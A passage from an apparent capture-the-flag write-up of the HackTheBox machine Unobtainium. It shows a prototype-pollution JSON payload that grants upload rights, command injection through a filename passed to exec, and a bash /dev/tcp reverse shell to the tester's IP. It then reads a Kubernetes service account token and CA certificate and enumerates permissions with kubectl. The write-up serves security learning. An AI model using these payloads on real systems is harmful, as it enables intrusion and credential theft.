  <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nf">findUser</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">auth</span> <span class="o">||</span> <span class="p">{});</span>

  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>                                 
    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">send</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">error</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Access denied</span><span class="dl">'</span><span class="p">});</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>

<span class="p">...[</span><span class="nx">snip</span><span class="p">]...</span>
<span class="p">});</span>
</code></pre></div></div>

<p>The routes are:</p>

<ul>
  <li>GET <code class="language-plaintext highlighter-rouge">/</code> - Returns <code class="language-plaintext highlighter-rouge">messages</code>, which is initialized to <code class="language-plaintext highlighter-rouge">[]</code></li>
  <li>PUT <code class="language-plaintext highlighter-rouge">/</code> - pushes a new message JSON structure into <code class="language-plaintext highlighter-rouge">messages</code>, requires user auth</li>
  <li>DELETE <code class="language-plaintext highlighter-rouge">/</code> - removes a message from <code class="language-plaintext highlighter-rouge">messages</code>, requires user with <code class="language-plaintext highlighter-rouge">canDelete</code></li>
  <li>POST <code class="language-plaintext highlighter-rouge">/upload</code> - uploads a file using the <code class="language-plaintext highlighter-rouge">google-cloudstorage-commands</code> object, requires user with <code class="language-plaintext highlighter-rouge">canUpload</code></li>
  <li>POST <code class="language-plaintext highlighter-rouge">/todo</code> - loops over files in <code class="language-plaintext highlighter-rouge">/usr/src/app</code> and returns the contents if it matches the given filename, requires user auth</li>
</ul>

<h3 id="identify-command-injection">Identify Command Injection</h3>

<h4 id="analysis-of-upload">Analysis of /upload</h4>

<p>The <code class="language-plaintext highlighter-rouge">/upload</code> route first checks for authentication with a user that has <code class="language-plaintext highlighter-rouge">canUpload</code>, and then calls <code class="language-plaintext highlighter-rouge">root.upload</code>:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/upload</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>    
  <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nf">findUser</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">auth</span> <span class="o">||</span> <span class="p">{});</span>    
  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">user</span> <span class="o">||</span> <span class="o">!</span><span class="nx">user</span><span class="p">.</span><span class="nx">canUpload</span><span class="p">)</span> <span class="p">{</span>    
    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">send</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">error</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Access denied</span><span class="dl">'</span><span class="p">});</span>    
    <span class="k">return</span><span class="p">;</span>    
  <span class="p">}</span>    
    
    
  <span class="nx">filename</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">filename</span><span class="p">;</span>    
  <span class="nx">root</span><span class="p">.</span><span class="nf">upload</span><span class="p">(</span><span class="dl">"</span><span class="s2">./</span><span class="dl">"</span><span class="p">,</span><span class="nx">filename</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>    
  <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">Uploaded_File</span><span class="p">:</span> <span class="nx">filename</span><span class="p">});</span>    
<span class="p">});</span>  
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">root</code> is the imported <code class="language-plaintext highlighter-rouge">google-cloudstorage-commands</code> module.</p>

<h4 id="analysis-of-google-cloudstorage-commands">Analysis of google-cloudstorage-commands</h4>

<p>Looking into this package a bit, the <a href="https://www.npmjs.com/package/google-cloudstorage-commands">page on NPM</a> has a large deprecated banner at the top:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210408134123104.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210408134123104.png" alt="image-20210408134123104" class="include_image " />
</picture>

<p>The <a href="https://www.npmjs.com/package/google-cloudstorage-commands">GitHub page</a> shows no commits since Nov 2017:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210408134214572.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210408134214572.png" alt="image-20210408134214572" class="include_image " />
</picture>

<p>The <code class="language-plaintext highlighter-rouge">upload</code> command used on Unobtainium is in <code class="language-plaintext highlighter-rouge">index.js</code>:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">exec</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nx">exec</span>
<span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">path</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">P</span> <span class="o">=</span> <span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>

    <span class="kd">const</span> <span class="nx">BASE_URL</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://storage.googleapis.com/</span><span class="dl">'</span>

    <span class="kd">function</span> <span class="nf">upload</span><span class="p">(</span><span class="nx">inputDirectory</span><span class="p">,</span> <span class="nx">bucket</span><span class="p">,</span> <span class="nx">force</span> <span class="o">=</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">yes</span><span class="p">,</span> <span class="nx">no</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="kd">let</span> <span class="nx">_path</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nf">resolve</span><span class="p">(</span><span class="nx">inputDirectory</span><span class="p">)</span>
            <span class="kd">let</span> <span class="nx">_rn</span> <span class="o">=</span> <span class="nx">force</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">-r</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">-Rn</span><span class="dl">'</span>
            <span class="kd">let</span> <span class="nx">_cmd</span> <span class="o">=</span> <span class="nf">exec</span><span class="p">(</span><span class="s2">`gsutil -m cp </span><span class="p">${</span><span class="nx">_rn</span><span class="p">}</span><span class="s2"> -a public-read </span><span class="p">${</span><span class="nx">_path</span><span class="p">}</span><span class="s2"> </span><span class="p">${</span><span class="nx">bucket</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
            <span class="nx">_cmd</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">exit</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nf">yes</span><span class="p">()</span>
            <span class="p">})</span>
        <span class="p">})</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>It is just setting variables, and then calling <code class="language-plaintext highlighter-rouge">exec</code> on <code class="language-plaintext highlighter-rouge">gsutil</code>. This immediately looks vulnerable to command injection.</p>

<p>Unfortunately, I can’t test this yet because I can’t access <code class="language-plaintext highlighter-rouge">/upload</code> with the felamos user, and I dont have a password for admin:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-X</span> POST http://10.10.10.235:31337/upload <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "test"}'</span>
<span class="go">{"ok":false,"error":"Access denied"}
</span></code></pre></div></div>

<h3 id="prototype-pollution">Prototype Pollution</h3>

<h4 id="background">Background</h4>

<p>Prototype pollution is an attack that happens when attacker controlled data is passed into operations like <code class="language-plaintext highlighter-rouge">merge</code> in JavaScript. <a href="https://codeburst.io/what-is-prototype-pollution-49482fc4b638">This post</a> and <a href="https://blog.0daylabs.com/2019/02/15/prototype-pollution-javascript/">this post</a> do a really nice job describing it. If I can get an object with <code class="language-plaintext highlighter-rouge">__proto__.someProp = 'xyz'</code>  into a <code class="language-plaintext highlighter-rouge">merge</code>, then <em>all JavaScript objects</em> will have <code class="language-plaintext highlighter-rouge">.someProp</code> equal to <code class="language-plaintext highlighter-rouge">'xyz'</code>.  For example, I can play in the Firefox dev tools console:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210408132959955.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210408132959955.png" alt="image-20210408132959955" class="include_image " />
</picture>

<p>Setting <code class="language-plaintext highlighter-rouge">__proto__.evil</code> on <code class="language-plaintext highlighter-rouge">test2</code> not only sets <code class="language-plaintext highlighter-rouge">evil</code> on <code class="language-plaintext highlighter-rouge">test2</code>, but also <code class="language-plaintext highlighter-rouge">test1</code> and later <code class="language-plaintext highlighter-rouge">test3</code> (once I create it).</p>

<h4 id="on-unobtainium">On Unobtainium</h4>

<p>I want to access</p>

<p>The PUT <code class="language-plaintext highlighter-rouge">/</code> route is vulnerable here:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>   
  <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nf">findUser</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">auth</span> <span class="o">||</span> <span class="p">{});</span>

  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>                                 
    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">send</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">error</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Access denied</span><span class="dl">'</span><span class="p">});</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">icon</span><span class="p">:</span> <span class="dl">'</span><span class="s1">__</span><span class="dl">'</span><span class="p">,</span>
  <span class="p">};</span>

  <span class="nx">_</span><span class="p">.</span><span class="nf">merge</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">message</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">id</span><span class="p">:</span> <span class="nx">lastId</span><span class="o">++</span><span class="p">,</span>
    <span class="na">timestamp</span><span class="p">:</span> <span class="nb">Date</span><span class="p">.</span><span class="nf">now</span><span class="p">(),</span>
    <span class="na">userName</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
  <span class="p">});</span>

  <span class="nx">messages</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
  <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div>

<p>It is running a <code class="language-plaintext highlighter-rouge">merge</code> on <code class="language-plaintext highlighter-rouge">message</code> and <code class="language-plaintext highlighter-rouge">req.body.message</code>. I want to get my pollution payload into <code class="language-plaintext highlighter-rouge">req.body.message</code>. Looking at <code class="language-plaintext highlighter-rouge">src/js/app.js</code>, the PUT to <code class="language-plaintext highlighter-rouge">/</code> has a body of:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">data</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">({</span><span class="dl">"</span><span class="s2">auth</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">felamos</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Winter2021</span><span class="dl">"</span><span class="p">},</span> <span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span><span class="p">:</span> <span class="nx">message</span><span class="p">}})</span>
</code></pre></div></div>

<p>I’ll need a valid user to get by <code class="language-plaintext highlighter-rouge">if (!user)</code>, but I have that. The payload (with spacing) will be:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"auth"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"felamos"</span><span class="p">,</span><span class="w"> 
    </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Winter2021"</span><span class="w">
  </span><span class="p">},</span><span class="w"> 
  </span><span class="nl">"message"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"test"</span><span class="p">:</span><span class="w"> </span><span class="s2">"something"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"__proto__"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"canUpload"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>I’ll do the prototype pollution attack, and now I can access the <code class="language-plaintext highlighter-rouge">upload</code> route:</p>

<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-X</span> PUT  http://10.10.10.235:31337/ <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"test": "something", "__proto__": {"canUpload": true}}}'</span>
<span class="go">{"ok":true}

</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-X</span> POST http://10.10.10.235:31337/upload <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "test"}'</span>
<span class="go">{"ok":true,"Uploaded_File":"test"}
</span></code></pre></div></div>

<p>This privilege seems to reset within a few seconds of setting it, so I’ll have to work quickly and re-enable it every few uses.</p>

<h3 id="exploit-command-injection">Exploit Command Injection</h3>

<h4 id="poc">POC</h4>

<p>To see if this works, I’ll put a <code class="language-plaintext highlighter-rouge">; [command]</code> in the filename, and see if the package will execute that command. I always like to start with a <code class="language-plaintext highlighter-rouge">ping</code>. With <code class="language-plaintext highlighter-rouge">tcpdump</code> listening, I’ll send this:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-X</span> POST http://10.10.10.235:31337/upload <span class="nt">-H</span> <span class="s1">'content-type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; ping -c 1 10.10.14.7"}'</span>
<span class="go">{"ok":true,"Uploaded_File":"x; ping -c 1 10.10.14.7"}
</span></code></pre></div></div>

<p>I get the ping at <code class="language-plaintext highlighter-rouge">tcpdump</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> tun0 icmp
<span class="go">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:48:37.119550 IP 10.10.10.235 &gt; 10.10.14.7: ICMP echo request, id 19, seq 1, length 64
13:48:37.119585 IP 10.10.14.7 &gt; 10.10.10.235: ICMP echo reply, id 19, seq 1, length 64
</span></code></pre></div></div>

<p>That’s remote code execution (RCE).</p>

<h4 id="shell">Shell</h4>

<p>I’ll swap out the <code class="language-plaintext highlighter-rouge">ping</code> with a Bash reverse shell. It took a couple tries to get the quotes right, but on running this:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-X</span> POST http://10.10.10.235:31337/upload <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; bash -c \"bash &gt;&amp; /dev/tcp/10.10.14.7/443 0&gt;&amp;1\""}'</span>
<span class="go">{"ok":true,"Uploaded_File":"x; bash -c \"bash &gt;&amp; /dev/tcp/10.10.14.7/443 0&gt;&amp;1\""}
</span></code></pre></div></div>

<p>A shell returned at <code class="language-plaintext highlighter-rouge">nc</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
<span class="go">listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.235] 40804
id
uid=0(root) gid=0(root) groups=0(root)
</span></code></pre></div></div>

<p>Python is on the box, so I can get a full PTY:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>which python
/usr/bin/python
python -c 'import pty;pty.spawn("bash")'
root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# 
</code></pre></div></div>

<p>There’s also <code class="language-plaintext highlighter-rouge">user.txt</code> in <code class="language-plaintext highlighter-rouge">/root</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@webapp-deployment-5d764566f4-mbprj:~#</span><span class="w"> </span><span class="nb">cat </span>user.txt 
<span class="go">a34770469e2c39603b53a4dda1b9
</span></code></pre></div></div>

<h2 id="shell-as-root-in-dev">Shell as root in dev</h2>

<h3 id="enumeration">Enumeration</h3>

<h4 id="kubernetes">Kubernetes</h4>

<p>I’m already root, and not on the main host. I’m in a container. Given the signs from port 8443 above, I suspect it might be a container managed by Kubernetes. I found <a href="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1">this post</a> on pentesting Kubernetes and looked for things to look for.</p>

<h4 id="find-token">Find Token</h4>

<p>Kubernetes uses YAML files to define containers. I noticed in several of the attacks, it would define a container that read from <code class="language-plaintext highlighter-rouge">/run/secrets/kubernetes.io/serviceaccount/token</code> and used that to <code class="language-plaintext highlighter-rouge">curl</code> the Kubernetes API on TCP 8443. For example:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210408141322775.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210408141322775.png" alt="image-20210408141322775" class="include_image " />
</picture>

<p>These are commands that would run inside the container, and interact with the API. Given that I’m already in the container, I’ll look for that token. It’s there:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@webapp-deployment-5d764566f4-mbprj:/#</span><span class="w"> </span><span class="nb">ls</span> /run/secrets/kubernetes.io/serviceaccount/
<span class="go">ca.crt  namespace  token
</span><span class="gp">root@webapp-deployment-5d764566f4-mbprj:/#</span><span class="w"> </span><span class="nb">cat</span> /run/secrets/kubernetes.io/serviceaccount/token 
<span class="go">eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tZ3YycHEiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjQwODNiNTAyLWU0ZGMtNGZiMC1iNzU1LTY0ZmU3ZGVkMzcxNSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mmkqCtOB3qHPkdybHAJuaLGpQk01UGqecZZO9TfMMeO02PO2CfXoeuRyR1I0BDmyJlxuzuDZdl0k6i0AsQF4DU3Ow_Rm-YZ5cIWDVV3tfuWIA0PvJsmlJqDC4X4OmbOIULLw4i5ckWO_0I35OhlRRLumnaRRrJKFaRnWA1H-zRyAPF3fBGtUuFJecHLNTOaDMyffvBCcblT5z4jjC7V4jKKG05NUNY4UNvvtCiFfevoeTfUzJ4L2dFtkOkHV8k_nC__eJu-CqOvLQlNAWgnJvhNLry_5IVGPxos80R0IC8gOto5bFx0WsSj5av56ff_1UsnDD68IG9uHdinOZC4xvA
</span></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">namespace</code> file gives the namespace of the access level, where <code class="language-plaintext highlighter-rouge">default</code> is the default level and typically least privileged.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@webapp-deployment-5d764566f4-mbprj:/#</span><span class="w"> </span><span class="nb">cat</span> /run/secrets/kubernetes.io/serviceaccount/namespace 
<span class="go">default
</span></code></pre></div></div>

<p>Still, this token should be able to interact with the API.</p>

<h3 id="api">API</h3>

<h4 id="kubectl">kubectl</h4>

<p>Because Unobtainium is running the Kubernetes controller on 8443 which is accessible to me directory, I can run the control software from my vm.</p>

<p>To interact with the API, for simple tasks I can use <code class="language-plaintext highlighter-rouge">curl</code>, but that aricle also shows using a tool <code class="language-plaintext highlighter-rouge">kubectl</code>. I’ll follow the <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/">install instructions</a>, and then give it a run. There’s a ton of subcommands. I tried a simple command I got <a href="https://kubernetes.io/docs/tasks/access-application-cluster/list-all-running-container-images/">here</a>, <code class="language-plaintext highlighter-rouge">get pods</code>, and it complained about the certificate:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>default-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 get pods <span class="nt">--all-namespaces</span>
<span class="go">Unable to connect to the server: x509: certificate signed by unknown authority
</span></code></pre></div></div>

<p>There was a certificate in the container:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@webapp-deployment-5d764566f4-mbprj:/#</span><span class="w"> </span><span class="nb">cat</span> /run/secrets/kubernetes.io/serviceaccount/ca.crt 
<span class="go">-----BEGIN CERTIFICATE-----
MIIC5zCCAc+gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIxMDEwNzEzMjQ0OVoXDTMxMDEwNjEzMjQ0OVowFTETMBEGA1UE
AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMTC
j3HOO1tahMOPzd68naKhBeiaAZ3iqt/ScnegTglKmtz5DagED5YajZM+UyvPEqQ+
u+mb1Zc1Kbrc2Fg3C48BY7OIP6GfOX990PDKJhqZtaOAdcU5Ga1avS+l3do6V2kC
eVstwX6SVIbzGJEUxMUPiZsFt6HsvN7htP1P5gewwtgsVIXDyLl/eRfwCn2ZW+n3
NgC4OI84zjVHpXmXFaGseDHb/E4wK/N0hMD0DEVPJsEOogHM9LndUgyJmhAtWbEj
25+H8AwQi3/8PYNEsmtSAUEuWtY36px/sD5CthiNlNpkB5t5c1GK90DmyofqBgYv
9wkCNGGZKp3AxMMN2nsCAwEAAaNCMEAwDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3
DQEBCwUAA4IBAQAHJjo8Uc3SH1UnsKSwZJTuyj36W/msbMr0pSn3dlE6BouukhF3
9GxmVa2an4/VFJkAsZSqFUz1e52qvJoFJcXec4MiN6GZTWuUA9D/jqiapnHWeO8x
RGk4WN66ZraM0X3PqaHo+cbfhKOlL9jkUxvE+3BWuj9plyD3n9tFe3lnasDfzy4M
q465ixPZqFqVchxQFQ+pZ24KiqoQW4mam/x5FPy13+Mw8J4zb8vLduvLQR3wpUGb
vKXdnKOLWsiExyrjpZjZbYBL8b705XFFGvmabp21aG8psB1XvsLiGFQEqyDfeFRW
hl7KpUISl4+Np5sAiXNwtbSDE+22QVtZbuDn
-----END CERTIFICATE-----
</span></code></pre></div></div>

<p>With that, I can successfully run the command enough to find that I can’t run the command:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl get pods <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>default-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt <span class="nt">--all-namespaces</span>
<span class="go">Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:default" cannot list resource "pods" in API group "" at the cluster scope
</span></code></pre></div></div>

<p>Alternatively, I could also run <code class="language-plaintext highlighter-rouge">kubectl</code> from within the container. It’s not there, but I can upload a copy from my vm, and run it, and it doesn’t need the <code class="language-plaintext highlighter-rouge">--token</code>, <code class="language-plaintext highlighter-rouge">--server</code> or <code class="language-plaintext highlighter-rouge">--certificate-authority</code> flags:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@webapp-deployment-5d764566f4-h5zhw:/tmp#</span><span class="w"> </span>./kubectl get pods
<span class="go">Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:default" cannot list resource "pods" in API group "" in the namespace "default"
</span></code></pre></div></div>

<p>That did error out, but in a way that shows I’m talking to the API successfully.</p>

<p>This approach will be useful for a common real life engagement, where a container is able to communicate with the Kubernetes server that is not accessible otherwise.</p>

<h4 id="find-container">Find Container</h4>

<p>The <code class="language-plaintext highlighter-rouge">auth</code> command is interesting:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl auth <span class="nt">-h</span> <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>default-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">Inspect authorization

Available Commands:
  can-i       Check whether an action is allowed
  reconcile   Reconciles rules for RBAC Role, RoleBinding, ClusterRole, and ClusterRoleBinding objects

Usage:
  kubectl auth [flags] [options]

Use "kubectl &lt;command&gt; --help" for more information about a given command.
Use "kubectl options" for a list of global command-line options (applies to all commands).
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">kubectl auth can-i -h</code> gives some useful information on how to use this. <code class="language-plaintext highlighter-rouge">--list</code> will give all things this user can do within the current namespace:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl auth can-i <span class="nt">--list</span> <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>default-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
